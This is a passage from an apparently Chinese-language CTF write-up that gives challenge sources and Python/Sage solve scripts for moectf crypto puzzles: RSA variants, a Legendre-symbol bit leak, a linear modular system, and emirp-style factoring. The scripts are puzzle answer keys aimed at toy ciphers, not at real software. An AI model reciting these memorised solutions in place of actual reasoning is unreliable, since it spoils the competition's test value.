1582486998399823540384313363363200260039711250093373548450892400684356890467422451159815746483347199068277830442685312502502514973605405506156013209395631708510855837597653498237290013890476973370263029834010665311042146273467094659451409034794827522542915103958741659248650774670557720668659089460310790788084368196624348469099001192897822358856214600885522908210687134137858300443670196386746010492684253036113022895437366747816728740885167967611021884779088402351311559013670949736441410139393856449468509407623330301946032314939458008738468741010360957434872591481558393042769373898724673597908686260890901656655294366875485821714239821243979564573095617073080807533166477233759321906588148907331569823186970816432053078415316559827307902239918504432915818595223579467402557885923581022810437311450172587275470923899187494633883841322542969792396699601487817033616266657366148353065324836976610554682254923012474470450197</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>纯粹多余的<code>RSA(</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">r = N//n</span><br><span class="line">d = inverse(e, r-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(C, d, r)))</span><br></pre></td></tr></table></figure><h2 id="ezlegendre"><a class="markdownIt-Anchor" href="#ezlegendre"></a> ezlegendre</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">a = randprime(<span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;moectf&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    ciphertext = []</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag])</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> plaintext:</span><br><span class="line">        e = randprime(<span class="number">2</span>, p)</span><br><span class="line">        n = <span class="built_in">pow</span>(<span class="built_in">int</span>(bit) + a, e , p)</span><br><span class="line">        ciphertext.append(n)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt_flag(FLAG))</span><br></pre></td></tr></table></figure><p>二次剩余，有点奇怪，我之前见到flag的比特位放在指数的位置，这题却是在底数的位置</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">QR，a+<span class="number">1</span></span><br><span class="line">QNR，a+<span class="number">0</span></span><br></pre></td></tr></table></figure><p>对于底数这种情况，我好像暂时没有办法解释，但可通过定义进行验证<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>≡</mo><mn>1</mn><mi mathvariant="normal">/</mi><mo>−</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n^{(p-1)//2}\equiv 1/-1(mod\ q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">303597842163255391032954159827039706827</span></span><br><span class="line">a = <span class="number">34032839867482535877794289018590990371</span></span><br><span class="line">e = randprime(<span class="number">2</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(a+<span class="number">1</span>, e*(p-<span class="number">1</span>)//<span class="number">2</span>, p))</span><br><span class="line"><span class="comment"># (1,1) (0,-1)</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = []</span><br><span class="line">p = <span class="number">303597842163255391032954159827039706827</span></span><br><span class="line">a = <span class="number">34032839867482535877794289018590990371</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    b=legendre_symbol(i,p)</span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">1</span>:</span><br><span class="line">        flag+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)).decode())</span><br></pre></td></tr></table></figure><h2 id="new_system"><a class="markdownIt-Anchor" href="#new_system"></a> new_system</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long </span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;???????????????&#125;&#x27;</span></span><br><span class="line">gift = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parametergenerate</span>():</span><br><span class="line">    q = getPrime(<span class="number">256</span>)</span><br><span class="line">    gift1 = randint(<span class="number">1</span>, q)</span><br><span class="line">    gift2 = (gift - gift1) % q</span><br><span class="line">    x =  randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">assert</span> gift == (gift1 + gift2) % q</span><br><span class="line">    <span class="keyword">return</span> q , x , gift1, gift2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m , q , x</span>):</span><br><span class="line">    a = randint(<span class="number">1</span>, q)</span><br><span class="line">    c = (a*x + m) % q</span><br><span class="line">    <span class="keyword">return</span> [a , c]</span><br><span class="line"></span><br><span class="line">q , x , gift1 , gift2 = parametergenerate()</span><br><span class="line"><span class="built_in">print</span>(encrypt(gift1 , q , x))</span><br><span class="line"><span class="built_in">print</span>(encrypt(gift2 , q , x))</span><br><span class="line"><span class="built_in">print</span>(encrypt(gift , q , x))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[48152794364522745851371693618734308982941622286593286738834529420565211572487, 21052760152946883017126800753094180159601684210961525956716021776156447417961]</span></span><br><span class="line"><span class="string">[48649737427609115586886970515713274413023152700099032993736004585718157300141, 6060718815088072976566240336428486321776540407635735983986746493811330309844]</span></span><br><span class="line"><span class="string">[30099883325957937700435284907440664781247503171217717818782838808179889651361, 85333708281128255260940125642017184300901184334842582132090488518099650581761]</span></span><br><span class="line"><span class="string">q = 105482865285555225519947662900872028851795846950902311343782163147659668129411</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>=</mo><mi>a</mi><mn>1</mn><mo>∗</mo><mi>x</mi><mo>+</mo><mi>g</mi><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c1=a1*x+g1 mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">1</span><span class="mord"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo>=</mo><mi>a</mi><mn>2</mn><mo>∗</mo><mi>x</mi><mo>+</mo><mi>g</mi><mn>2</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c2=a2*x+g2 mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">2</span><span class="mord"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>3</mn><mo>=</mo><mi>a</mi><mn>3</mn><mo>∗</mo><mi>x</mi><mo>+</mo><mi>g</mi><mn>1</mn><mo>+</mo><mi>g</mi><mn>2</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c3=a3*x+g1+g2 mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">2</span><span class="mord"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mo stretchy="false">(</mo><mi>c</mi><mn>3</mn><mo>−</mo><mi>c</mi><mn>2</mn><mo>−</mo><mi>c</mi><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>a</mi><mn>3</mn><mo>−</mo><mi>a</mi><mn>2</mn><mo>−</mo><mi>a</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">x=(c3-c2-c1)*(a3-a2-a1)^{-1} mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a1, c1 = (<span class="number">48152794364522745851371693618734308982941622286593286738834529420565211572487</span>,</span><br><span class="line">          <span class="number">21052760152946883017126800753094180159601684210961525956716021776156447417961</span>)</span><br><span class="line">a2, c2 = (<span class="number">48649737427609115586886970515713274413023152700099032993736004585718157300141</span>,</span><br><span class="line">          <span class="number">6060718815088072976566240336428486321776540407635735983986746493811330309844</span>)</span><br><span class="line">a3, c3 = (<span class="number">30099883325957937700435284907440664781247503171217717818782838808179889651361</span>,</span><br><span class="line">          <span class="number">85333708281128255260940125642017184300901184334842582132090488518099650581761</span>)</span><br><span class="line">q = <span class="number">105482865285555225519947662900872028851795846950902311343782163147659668129411</span></span><br><span class="line">x = (c3-c2-c1)*inverse(a3-a2-a1, q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes((c3-a3*x % q)).decode())</span><br></pre></td></tr></table></figure><h2 id="rsa_revenge"><a class="markdownIt-Anchor" href="#rsa_revenge"></a> RSA_revenge</h2><p><a href="https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/index.html#Reverse">https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/index.html#Reverse</a><br /><code>p q</code>二进制互反，<code>emirp数</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901</span></span><br><span class="line">c = <span class="number">47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="comment"># sqrt(n)有512位2进制位, 需计算高低位每边的256位</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">256</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="comment"># 对两个素数因子尝试爆破未遍历的位爆破</span></span><br><span class="line">            a1 = a + i*(<span class="number">2</span>**k) + j*(<span class="number">2</span>**(<span class="number">511</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">2</span>**k) + i*(<span class="number">2</span>**(<span class="number">511</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="comment"># 当a1和b1过大</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">2</span>**(<span class="number">511</span>-k)))*(b1+(<span class="number">2</span>**(<span class="number">511</span>-k))) &lt; n:</span><br><span class="line">                <span class="comment"># 当a1和b1过小</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1) % (<span class="number">2</span>**(k+<span class="number">1</span>))) != (n % (<span class="number">2</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="comment"># 当a1*b1的最后k+1位（不变）与n的最后k+1位不同</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 满足条件的(a1,b1)值，尝试继续遍历</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个素数因子有512位2进制位, 尝试可能的所有中间位</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t(i*(<span class="number">2</span>**<span class="number">256</span>), i*(<span class="number">2</span>**<span class="number">256</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p, q = <span class="number">11660635291534613230423193509391946961264539191735481147071890944740311229658362673314192872117237108949853531941630122241060679012089130178372253390640871</span>, <span class="number">12119998731259483292178496920109290754181396164390285597126378297678818779092115139911720576157973310671490865211601201831597946479039132512609504866583931</span></span><br><span class="line"><span class="built_in">print</span>(p*q == n)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br></pre></td></tr></table></figure><h2 id="no_way_to_find_the_flag这题被下了不过也没看"><a class="markdownIt-Anchor" href="#no_way_to_find_the_flag这题被下了不过也没看"></a> no_way_to_find_the_flag(这题被下了，不过也没看)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.linalg <span class="keyword">import</span> block_diag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;???????????????????&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">b</span>):</span><br><span class="line">    p = randint(<span class="number">2</span> ** (b - <span class="number">1</span>), <span class="number">2</span> ** b)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(p):</span><br><span class="line">        p = randint(<span class="number">2</span> ** (b - <span class="number">1</span>), <span class="number">2</span> ** b)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateSophieGermainPrime</span>(<span class="params">k</span>):</span><br><span class="line">    p = gen_prime(k - <span class="number">1</span>)</span><br><span class="line">    sp = <span class="number">2</span> * p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(sp):</span><br><span class="line">        p = gen_prime(k - <span class="number">1</span>)</span><br><span class="line">        sp = <span class="number">2</span> * p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text2array</span>(<span class="params">txt</span>):</span><br><span class="line">    ary = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> txt.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> row.strip() != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            row = row.replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">            ary.append([<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> row.split()])</span><br><span class="line">    <span class="keyword">return</span> np.array(ary, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">29</span>:</span><br><span class="line">        datatype = <span class="string">&#x27;object&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        datatype = np.int64</span><br><span class="line"></span><br><span class="line">    q = generateSophieGermainPrime(k)</span><br><span class="line">    l = <span class="built_in">int</span>(np.ceil(log2(q)))</span><br><span class="line"></span><br><span class="line">    n = k</span><br><span class="line">    m = n * l</span><br><span class="line"></span><br><span class="line">    s = np.random.randint(q, size=n - <span class="number">1</span>, dtype=np.int64).astype(datatype)</span><br><span class="line">    t = np.append(s, <span class="number">1</span>)</span><br><span class="line">    e = np.rint(np.random.normal(scale=<span class="number">1.0</span>, size=m)).astype(<span class="built_in">int</span>).astype(datatype)</span><br><span class="line">    A = np.random.randint(q, size=(n - <span class="number">1</span>, m), dtype=np.int64).astype(datatype)</span><br><span class="line">    B = np.vstack((-A, np.dot(s, A) + e)) % q</span><br><span class="line"></span><br><span class="line">    check = np.dot(t, B) % q</span><br><span class="line">    okay = np.<span class="built_in">all</span>(check == (e % q))</span><br><span class="line">    <span class="keyword">if</span> okay:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Keygen check passed&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Keygen check failed&quot;</span>)  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Keys</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, k, q, t, e, A, B, datatype</span>):</span><br><span class="line">            self.k = k</span><br><span class="line">            self.q = q</span><br><span class="line">            self.t = t</span><br><span class="line">            self.e = e</span><br><span class="line">            self.A = A</span><br><span class="line">            self.B = B</span><br><span class="line">            self.datatype = datatype</span><br><span class="line">            self.l = l</span><br><span class="line">            self.n = n</span><br><span class="line">            self.m = <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Keys(k, q, t, e, A, B, datatype)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buildGadget</span>(<span class="params">l, n</span>):</span><br><span class="line">    g = <span class="number">2</span> ** np.arange(l)</span><br><span class="line">    <span class="keyword">return</span> block_diag(*[g <span class="keyword">for</span> null <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">keys, message</span>):</span><br><span class="line">    R = np.random.randint(<span class="number">2</span>, size=(keys.m, keys.m), dtype=np.int64).astype(keys.datatype)</span><br><span class="line">    G = buildGadget(keys.l, keys.n)</span><br><span class="line">    <span class="keyword">return</span> (np.dot(keys.B, R) + message * G) % keys.q</span><br><span class="line"></span><br><span class="line">keys = keygen(<span class="number">16</span>)</span><br><span class="line">binary_flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(byte, <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> flag)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;keys_and_ciphertexts.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;Keys:\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;q: <span class="subst">&#123;keys.q&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;t: <span class="subst">&#123;keys.t&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;e: <span class="subst">&#123;keys.e&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;A: <span class="subst">&#123;keys.A&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;B: <span class="subst">&#123;keys.B&#125;</span>\n\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;Ciphertexts:\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> binary_flag:</span><br><span class="line">        ciphertext = encrypt(keys, <span class="built_in">int</span>(bit))</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;ciphertext&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="one-more-bit"><a class="markdownIt-Anchor" href="#one-more-bit"></a> One more bit</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, bytes_to_long, GCD, inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genKey</span>(<span 